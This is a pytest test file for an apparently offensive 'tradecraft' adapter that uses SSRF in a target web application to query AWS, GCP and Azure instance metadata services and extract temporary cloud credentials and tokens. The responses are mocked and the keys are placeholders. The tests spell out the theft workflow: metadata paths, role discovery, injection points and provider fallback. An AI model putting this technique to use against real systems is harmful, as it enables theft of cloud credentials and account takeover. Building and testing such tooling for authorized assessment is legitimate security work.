"""
Unit tests for cloud_metadata_credential_probe adapter (execute.py and parse.py).
"""
import json
from unittest.mock import patch

import pytest
import requests

from tradecraft.adapters.cloud_metadata_credential_probe.execute import (
    AWS_ROLE_DISCOVERY_URL,
    AZURE_TOKEN_URL,
    GCP_TOKEN_URL,
    PLACEHOLDER,
    HttpExchange,
    RawCredentialTheftResult,
    execute,
    normalize_target_url,
)
from tradecraft.adapters.cloud_metadata_credential_probe.parse import parse

AWS_ROLE_LIST = "production-eks-node\n"
AWS_CREDENTIALS_JSON = json.dumps({
    "Code": "Success",
    "LastUpdated": "2026-11-10T12:00:00Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAEXAMPLEKEY12345",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "AQoDYXdzEJr1111111111111111111111111111111111111111111111111111111",
    "Expiration": "2026-11-10T18:00:00Z",
})

GCP_TOKEN_JSON = json.dumps({
    "access_token": "ya29.c.b0example_gcp_token_abc123",
    "expires_in": 3599,
    "token_type": "Bearer",
})

AZURE_TOKEN_JSON = json.dumps({
    "access_token": "eyJhGexample_azure_token_jwt",
    "client_id": "client-uuid-1234",
    "expires_in": "86400",
    "expires_on": "1731250000",
    "resource": "https://management.azure.com/",
    "token_type": "Bearer",
})


class FakeResponder:
    def __init__(self, routes):
        self.routes = routes
        self.calls = []

    def request(self, method, url, **kwargs):
        self.calls.append({"method": method, "url": url, **kwargs})
        # Check from longest/most specific pattern to shortest
        sorted_patterns = sorted(self.routes.keys(), key=len, reverse=True)
        for pattern in sorted_patterns:
            response = self.routes[pattern]
            if pattern in url or (isinstance(kwargs.get("data"), str) and pattern in kwargs.get("data", "")):
                if isinstance(response, Exception):
                    raise response
                status, text = response
                resp = requests.Response()
                resp.status_code = status
                resp._content = text.encode("utf-8")
                resp.encoding = "utf-8"
                return resp
        resp = requests.Response()
        resp.status_code = 404
        resp._content = b"Not Found"
        return resp


def test_normalize_target_url():
    # No "direct" special-casing: 169.254.169.254/metadata.google.internal
    # only ever resolve to whichever machine is asking, so a literal
    # address is just normalized like any other hostname, never treated
    # as a signal to query the scanning host's own metadata service.
    assert normalize_target_url("http://example.com/api?url=__SSRF__") == "http://example.com/api?url=__SSRF__"
    assert normalize_target_url("example.com/api?url=__SSRF__") == "https://example.com/api?url=__SSRF__"
    assert normalize_target_url("169.254.169.254") == "https://169.254.169.254"
    assert normalize_target_url("   ") == ""


def test_validation_errors():
    res = execute(target="", provider="aws")
    assert res.error == "empty target URL"

    res = execute(target="http://example.com", provider="invalid_cloud")
    assert "provider must be one of" in res.error

    res = execute(target="http://example.com", inject_location="invalid_loc")
    assert "inject_location must be one of" in res.error

    # "direct" is deliberately not a valid location -- it would query the
    # scanning host's own metadata service, never the target's.
    res = execute(target="169.254.169.254", inject_location="direct")
    assert "inject_location must be one of" in res.error

    res = execute(target="http://example.com/no_placeholder", inject_location="url_param")
    assert "target URL missing the '__SSRF__' placeholder" in res.error

    res = execute(target="http://example.com", inject_location="json_body", json_body_template="")
    assert "json_body_template is required" in res.error

    res = execute(target="http://example.com", inject_location="json_body", json_body_template="{invalid")
    assert "json_body_template is not valid JSON" in res.error

    res = execute(target="http://example.com", inject_location="json_body", json_body_template='{"url": "test"}')
    assert "missing the '__SSRF__' placeholder" in res.error

    res = execute(target="http://example.com", inject_location="header", header_name="")
    assert "header_name is required" in res.error


def test_aws_ssrf_theft_flow():
    routes = {
        "iam/security-credentials/production-eks-node": (200, AWS_CREDENTIALS_JSON),
        "iam/security-credentials/": (200, AWS_ROLE_LIST),
    }
    responder = FakeResponder(routes)

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="http://vuln.target.com/proxy?url=__SSRF__",
            provider="aws",
            inject_location="url_param",
        )

    assert raw.error is None
    assert len(raw.exchanges) == 2
    assert raw.role_name == "production-eks-node"
    assert raw.raw_credential_json == AWS_CREDENTIALS_JSON

    parsed = parse(raw)
    assert parsed["credentials_obtained"] is True
    assert parsed["provider"] == "aws"
    assert parsed["role_name"] == "production-eks-node"
    assert parsed["credentials"]["access_key_id"] == "ASIAEXAMPLEKEY12345"
    assert parsed["credentials"]["secret_access_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert parsed["credentials"]["session_token"].startswith("AQoDYXdz")
    assert "Successfully extracted temporary AWS credentials" in parsed["summary"]


def test_aws_known_role_skips_discovery():
    routes = {
        "iam/security-credentials/custom-role": (200, AWS_CREDENTIALS_JSON),
    }
    responder = FakeResponder(routes)

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="http://vuln.target.com/proxy?url=__SSRF__",
            provider="aws",
            inject_location="url_param",
            role_name="custom-role",
        )

    assert raw.error is None
    assert len(raw.exchanges) == 1  # role supplied, so no discovery request
    assert raw.role_name == "custom-role"

    parsed = parse(raw)
    assert parsed["credentials_obtained"] is True
    assert parsed["credentials"]["access_key_id"] == "ASIAEXAMPLEKEY12345"


def test_gcp_ssrf_token_flow():
    routes = {
        "service-accounts/default/token": (200, GCP_TOKEN_JSON),
    }
    responder = FakeResponder(routes)

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="http://vuln.target.com/proxy?url=__SSRF__",
            provider="gcp",
            inject_location="url_param",
        )

    assert raw.error is None
    assert len(raw.exchanges) == 1
    # No Metadata-Flavor header is attached -- pure URL-based SSRF cannot
    # set it on the vulnerable backend's own outbound request.
    assert "Metadata-Flavor" not in responder.calls[0]["headers"]

    parsed = parse(raw)
    assert parsed["credentials_obtained"] is True
    assert parsed["provider"] == "gcp"
    assert parsed["credentials"]["token"] == "ya29.c.b0example_gcp_token_abc123"
    assert "GCP service account OAuth token" in parsed["summary"]


def test_azure_json_body_flow():
    routes = {
        "metadata/identity/oauth2/token": (200, AZURE_TOKEN_JSON),
    }
    responder = FakeResponder(routes)

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="https://target.com/api/fetch",
            provider="azure",
            inject_location="json_body",
            json_body_template='{"remote_url": "__SSRF__"}',
        )

    assert raw.error is None
    assert len(raw.exchanges) == 1

    parsed = parse(raw)
    assert parsed["credentials_obtained"] is True
    assert parsed["provider"] == "azure"
    assert parsed["credentials"]["token"] == "eyJhGexample_azure_token_jwt"
    assert parsed["credentials"]["client_id"] == "client-uuid-1234"
    assert "Azure Managed Identity token" in parsed["summary"]


def test_imdsv2_or_forbidden_handling():
    routes = {
        "iam/security-credentials/": (403, "Forbidden"),
    }
    responder = FakeResponder(routes)

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="http://vuln.target.com/proxy?url=__SSRF__",
            provider="aws",
            inject_location="url_param",
        )

    assert raw.error is None
    assert len(raw.exchanges) == 1

    parsed = parse(raw)
    assert parsed["credentials_obtained"] is False
    assert "403 Forbidden" in parsed["summary"]
    assert "IMDSv2" in parsed["summary"]


def test_auto_fallback_to_gcp():
    routes = {
        "iam/security-credentials/": (404, "Not Found"),
        "service-accounts/default/token": (200, GCP_TOKEN_JSON),
    }
    responder = FakeResponder(routes)

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="http://vuln.target.com/proxy?url=__SSRF__",
            provider="auto",
            inject_location="url_param",
        )

    assert raw.error is None
    assert raw.provider == "gcp"
    parsed = parse(raw)
    assert parsed["credentials_obtained"] is True
    assert parsed["provider"] == "gcp"
    assert parsed["credentials"]["token"] == "ya29.c.b0example_gcp_token_abc123"


def test_network_exception_handling():
    responder = FakeResponder({
        "iam/security-credentials/": requests.exceptions.ConnectTimeout("Connection timed out"),
    })

    with patch("tradecraft.adapters.cloud_metadata_credential_probe.execute.requests.request", side_effect=responder.request):
        raw = execute(
            target="http://vuln.target.com/proxy?url=__SSRF__",
            provider="aws",
            inject_location="url_param",
        )

    assert len(raw.exchanges) == 1
    assert "Connection timed out" in raw.exchanges[0].error

    parsed = parse(raw)
    assert parsed["credentials_obtained"] is False
    assert "Connection timed out" in parsed["summary"]
